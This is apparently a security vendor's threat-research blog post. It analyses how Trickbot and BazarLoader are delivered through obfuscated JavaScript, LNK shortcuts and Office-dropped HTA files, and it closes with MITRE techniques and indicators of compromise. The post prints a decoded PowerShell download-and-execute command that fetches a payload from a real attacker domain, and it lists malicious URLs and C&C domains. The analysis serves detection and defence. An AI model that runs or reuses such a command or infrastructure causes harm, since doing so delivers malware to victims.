New Trickbot and BazarLoader campaigns use multiple delivery vectors
October 08, 2021
The [Zscaler ThreatLabz](https://www.zscaler.com/threatlabz/threat-map-dashboard) research team monitors thousands of files daily tracking new and pervasive threats, including one of the most prominent banking trojans of the last five years: Trickbot.
Trickbot has been active since 2016 and is linked to a large number of malicious campaigns involving bitcoin mining and theft of banking information, personal identifying information (PII), and credentials.
BazarLoader is a spinoff of this trojan, developed by the same authors.
Both are particularly dangerous as they are easily modifiable and capable of delivering multi-stage payloads, as well as taking over computers entirely.
ThreatLabz has discovered Trickbot operators using new approaches to delivering payloads in recent attack campaigns.
The malware samples we analyzed were well-crafted and highly obfuscated with sandbox-evading capabilities.
In this blog post, we will show analysis of the different delivery vectors used by Trickbot and BazarLoader.
**Key Points:**
1.Script and LNK files added evasion techniques to leverage Malware threats.
2.Multilayer obfuscation is used to preclude analysis of JS and LNK files.
3.An Office attachment drops an HTA file with snippets of HTML and javascript functions.
4.Newly registered domains are used to deliver threats.
**Trickbot is expanding its range of file types for malware delivery**
In previous campaigns, Trickbot payloads were generally dropped as malicious attachments to Microsoft Office files.
In the last month, we’ve seen that malware has also used javascript files at a high volume, along with a range of other file formats, as shown in the following charts:
![Overall Trickbot blocked in the sandbox](https://lh4.googleusercontent.com/nYTw6h8k29JBGhwhhdbc-mjmG4C2oWIAhHu2Vu5ZzGMyBN7xD-0uVOavLStFbt-k5GF4eJcRL8BtlyhGohPr7oSja8nlKQVip9YeCTgNcIzeM9pyPP9V5XMyOJ8HZTXOj-LmH-Yl=s0)
*Fig1:Trickbot blocked in the Zscaler Cloud Sandbox*
*![Bazar overall blocked in the sandbox](https://lh3.googleusercontent.com/RZPwTirzFvm1T9IoVZHWgdxTRyniwcsRZ_F64TrjqtLTScKuOvhtVGP4w1xIiDsnbU5jlZznuJHcY1OH-W1IplAfY8kx-cRK6ya_MG-MfgvBJWrfESJ4uSCO4xW91bsZnaeJ72fj=s0)*
*Fig2:BazarLoader blocked in the Zscaler Cloud Sandbox*
In this blog, we’ll walk through the attack chain for multiple delivery vectors, including: 
* Trickbot spreading through scripting files
* Trickbot spreading through LNK files
* BazarLoader spreading through Office attachments
**Trickbot spreading through scripting files**
Trickbot gains intrusion using spam emails bundled with malicious javascript attachments, such as the following:  
![Spam](https://lh3.googleusercontent.com/eypFYtQ5GSXPvi3eeI1bsh-bzOerQbm0nHEAFNa4dTQygWDoDaYDNvJT35_N2tCVw_B9zVxmxJXNa93_L4i7aKjFwils7NHL1PC0ohZt4i6G1G9DkS28ia22M4pjzqPb6o7auRQ_=s0)
*Fig3:Spam email attachment*
In this case, the Javascript [***5B606A5495A55F2BD8559778A620F21B***] file has three layers of obfuscation that are mostly used to evade and bypass sandbox environments.
Below is the snapshot of the first obfuscated layer:
![First obfuscated layer](https://lh5.googleusercontent.com/eYBXrvjmEfCjfRG_hhEM9z-KqrpDlUq4UPqhOODjVDsJNaqIJ-zHv-u3bxa_1BRRZNqDMgqtudA3-XX85MT5Pa8TJvsEhrDBCIyr8MkO-Q8DD5IzNZ_GT-HXLo4oPqdKWsVSHEu1=s0)
*Fig4:First layer of obfuscation in javascript*
In addition to taking extreme effort to make javascript files highly obfuscated, the malware authors have also added large amounts of junk code to the end to make debugging more difficult.
The junk code is just random generated obfuscated strings that do not play any role with the malicious code.
![Junk code to make analysis difficult](https://lh5.googleusercontent.com/kS4l8D-a0K-3ZMpQHrE6nA9mE_2BZqXHhyayzJCjoDcoENf0mfe88xwkpFNOIuuUmP0pa7F5pjwZdL6blF6LqEJb326AoPL0Eys6GIJ77SwNiydOdpyVs0Ld4SisYZOH0nqqLLez=s0)
*Fig5:Junk code to make analysis difficult*
Using the **eval()** function we have de-obfuscated the second layer in which malicious code is embedded with more junk code.
After removing this layer of junk code, the **eval()** function is used once again to retrieve the final layer of code.
We can see that the Trickbot authors used the **setTimeout()** method, which evaluates an expression after a 967 milliseconds to delay execution in the sandbox.
This helps the malware evade sandbox environments.
![Second layer](https://lh3.googleusercontent.com/jRF4FrzzO2YdfzB32RTe2CjGkhnUtnrZ9UUhEdONPSy21k6P-qdxNemQhtTcWLHRklj-GdS0mWxGdoKWy5ZvCe_W1r2Vp3i8CffB5AEroF-eEbIz4D-G997CVtvZsIreHz3Vbi-G=s0)
*Fig6: Second layer of obfuscation in javascript*
In the above snapshot we are able to see the *replace* method implemented in the code where **“"hdBDJ"****and “tSJVh”** strings are removed from the variables **“YHPhEFtKjqbCmAZ”** and **“kVYJOrLSqvdAWnaGTX”** respectively to get the final string.
![Final layer](https://lh3.googleusercontent.com/MXb1TursKUiaV2cJK6Zfm4goeok6t_itvzUxMywAv-a3lbrJUhSD-kRsoKqmrzCcHmh6zfhuOfx_SqBz_Hf6TAsSoXoV6SstgBF9m3gZLjJbM1WLHXT_QL8q-D-jBNtQdwSwVZBU=s0)
*Fig7:Final layer*
The malicious Javascript executes cmd.exe as a child process, then cmd.exe executes powershell.exe to download Trickbot as payload.
**Flow of execution:**
***Wscript.exe ->cmd.exe->powershell.exe***
Powershell.exe embedded with base64 encoded command and after decoded following command is:
***IEX (New-Object Net.Webclient).downloadstring(https://jolantagraban{.}pl/log/57843441668980/dll/assistant{.}php")***
***![JS Sandbox](https://lh6.googleusercontent.com/MMzbYyG1_y5io7NT9Ctx2-pHpolw3VXJ5Cy4NcdmHzJt1CagHgljV5BMCsAxcuX8kq63LKs-4b-Fre1xpoiUtL5H7m2v9LodTMT6rUlxJk47Vzj5Qr8937mmYNZcpAFhc3eSE7G4=s0)***
*Fig8:Zscaler Cloud Sandbox detection of Javascript Downloader*
**Trickbot spreading through LNK files**
Windows LNK (LNK) extensions are usually seen by users as shortcuts, and we have frequently observed cybercriminals using LNK files to download malicious files such as Trickbot.
Trickbot hides the code in the argument section under the properties section of the LNK file.
The malware author added extra spaces in between the malicious code to attempt to make it more difficult for researchers to debug the code.
We’ve [seen this technique used previously](https://www.zscaler.com/blogs/security-research/independence-day-greeting-campaign-delivers-emotet-5) in the Emotet campaign using malicious Office attachments in 2018.
![Final LNK](https://lh5.googleusercontent.com/4kBHshm7MehqLjYwXNYH0ZgKdBB7cL9opZy_rDH_VnGSZFe9ZFaP1YlMa3oHUgF0HgAyEyblS5inBGyXMoiQiNQzrKX6NQf8yU7H0uFkd06oIoBs6WGyScV0QYt6WxjkqSV7x8Lp=s0)
*Fig9:Code embedded in the properties section of LNK*
*![](https://lh4.googleusercontent.com/vOdC1AvGcwl5R0yWgxF0P2fs822HQa2DpWSq9WSuP6GKMvrefyf2Y5KgAAPL5ADyrIeNBYGnY8IJpn38vtffaafRHoydCCxlm_o0FFihhsDamJ3E7fttitbQmd2pitL2tYvt3kg1=s0)*
**Downloading Trickbot :**
1.LNK downloads the file from 45.148.121.227/images/readytunes.png using a silent argument so that the user is not able to see any error message or progress action.
2.After downloading, the malware saves the file to the Temp folder with the name application1\_form.pdf.
3.Finally, the file is renamed from application1\_form.pdf to support.exe and executed.
Here, support.exe is Trickbot.
![Lnk Sandbox](https://lh3.googleusercontent.com/POlp0exS7G-TbRAn2_fHtTv6YAXBX4sKVtD39q_hVQN1D_61MDR1CnjGcjJBPzp_VLKOK0IWGJhJKcgEJvLHi6duWKt0jDUaagZJYNcjvVWSoi-iROG5L5N2vS3CLGJ13xKaVA8L=s0)
*Fig10:Zscaler Cloud Sandbox detection of LNK Downloader*
**BazarLoader spreading through Office attachments**
This is one of the other techniques used in [TA551 APT](https://malware.news/t/continuously-changing-malicious-word-macro-being-distributed-trend-of-ta551-2/53142) aka Shathak.
Malicious office documents drop the HTA file to **“C\ProgramData\sda.HTA”**.
This HTA file contains HTML and vbscript designed to retrieve a malicious DLL to infect a vulnerable Windows host with BazarLoader.
Once macro-enabled, the mshta.exe process executes to download a payload.
This campaign has been observed delivering BazarLoader and Trickbot in the past.
![](https://lh6.googleusercontent.com/TNKduiZwiO6q9M4GGVCeJyvqGa5XiVUfJZ8BApg7268hf2zQSq4Nm0jFBxac1DfCHEKPcxELxTx19lGAJQ3i0eQUE2rA8ooXL9J0EESPaYAiAHF3_kR4CSTRTmlbQsVAp9Mss0sH=s0)
*Fig11:Attack chain of DOC file to download BazarLoader*
Base64 encoded data is implemented in the HTML <div> tag which is used later with javascript.
![HTA_HTML](https://lh6.googleusercontent.com/lp6qLNJ4dxiAQ3RTRzgfOua13q5H-yg9zdKP0sek1-PgmMcB5JZ2J4QUo9T6KqMGIURE5tlmEHQPZntb4Ij89d-aD9YUJWr5oet_u1C3Xdm8dSYMu6WmQC_HPOsRp9vAISKFukSW=s0)
*Fig12:Dropped HTA file : Malicious base64 encoded under HTML <div> section*
Below is the snapshot of decode base64 data in which we can see it downloading the payload and saving as friendIFriend,jpg to the victim machine:
![Decoded HTA](https://lh5.googleusercontent.com/Oct_IQ4q5maqsgB9SpMDuhWhvowS7CmUMQqv_qinA8iFBuFM43dNAurFAbU1tCCqvVqXPWfNI0saeq7qswq_j7q8m4QqPuuTwRZbppHvUT-nhzCG-z3GObLb9-4CxKbXVkfer9yZ=s0)
*Fig13:Dropped HTA file : Decode Base64 data*
**Networking : C&C to download BazarLoader**
**![Networking](https://lh3.googleusercontent.com/7b_tc7RH2GeHYsrqQl4QUTby2fYlO4pLhfX4cjpjGMsbJFHnCNh20j1etoSRzgnZp0zDovTDtLI40R1lvPv6SmPAVfufBeTB8E5-OELNrkcLVPQzYwAFIUTKnW2cXUdYW-VvQGp-=s0)**
*Fig14:Sending request to download BazarLoader*
We have also observed newly registered domains (NRDs) specifically created to distribute these payloads, using a stealer delivered through spam email and bundled with a malicious Microsoft Office attachment.
![NRD](https://lh3.googleusercontent.com/4phrVtGF3kogBjCstdyuLmvRF-Q74OozQXDVBtcLtWya1rq5iUZ2lflXqSJdRs_abj8w_Mc2pIRmZkSUXKfZXiR32RO1OIJNpkxa50GmFHsq3pApV3nHNLqbbO1WEf8IgjRB2sYK=s0)
*Fig15: Newly registered domain*
*![DOC Sandbox](https://lh3.googleusercontent.com/4j6wBBXjY8UNIVVx7B-B9fbF7DxCrxUjVOWgAn94hQVXZtJA1RosJoegffscQinK7p-zH62F7_iz9VErv8miz2220kA_UfEamPDggspHns3UKwHbx4oV3momd7jP7o9LbtnO9Fi1=s0)*
*Fig16:Zscaler Cloud Sandbox detection of Malicious Office file Downloader*
[JS.Downloader.Trickbot](https://threatlibrary.zscaler.com/threats/37daac40-4651-4cd0-9947-b77713c75859)
[Win32.Backdoor.BazarLoader](https://threatlibrary.zscaler.com/threats/848ca346-b69f-468b-8bad-a12823237d4a)
[VBA.Downloader.BazarLoader](https://threatlibrary.zscaler.com/threats/81efe542-3de5-4efe-8362-12b368661598)
**MITRE ATT&CK**
| T5190 | Gather Victim Network Information |
| T1189 | Drive-by Compromise |
| T1082 | System Information Discovery |
| T1140 | Deobfuscate/Decode Files or Information |
| T1564 | Hide Artifacts |
| T1027 | Obfuscated Files or Information |
**Indicators of Compromise**
| **Md5** | **Filename** | **FileType** |
| B79AA1E30CD460B573114793CABDAFEB | 100.js | JS |
| AB0BC0DDAB99FD245C8808D2984541FB | 4821.js | JS |
| 192D054C18EB592E85EBF6DE4334FA4D | 4014.js | JS |
| 21064644ED167754CF3B0C853C056F54 | 7776.js | JS |
| 3B71E166590CD12D6254F7F8BB497F5A | 7770.js | JS |
| 5B606A5495A55F2BD8559778A620F21B | 68.js | JS |
| BA89D7FC5C4A30868EA060D526DBCF56 | Subcontractor Reviews (Sep 2021).lnk | LNK |
| **Md5** | **Filename** | **Filetype** |
| C7298C4B0AF3279942B2FF630999E746 | a087650f65f087341d07ea07aa89531624ad8c1671bc17751d3986e503bfb76.bin.sample.gz | DOC |
| 3F06A786F1D4EA3402A3A23E61279931 | - | DOC |
**Associated URLs:**
jolantagraban.pl/log/57843441668980/dll/assistant.php
blomsterhuset-villaflora.dk/assistant.php
d15k2d11r6t6rl.cloudfront.net/public/users/beefree
**C&C:**
| Domain | Payload |
| jolantagraban.pl | Trickbot |
| glareestradad.com | BazarLoader |
| francopublicg.com | BazarLoader |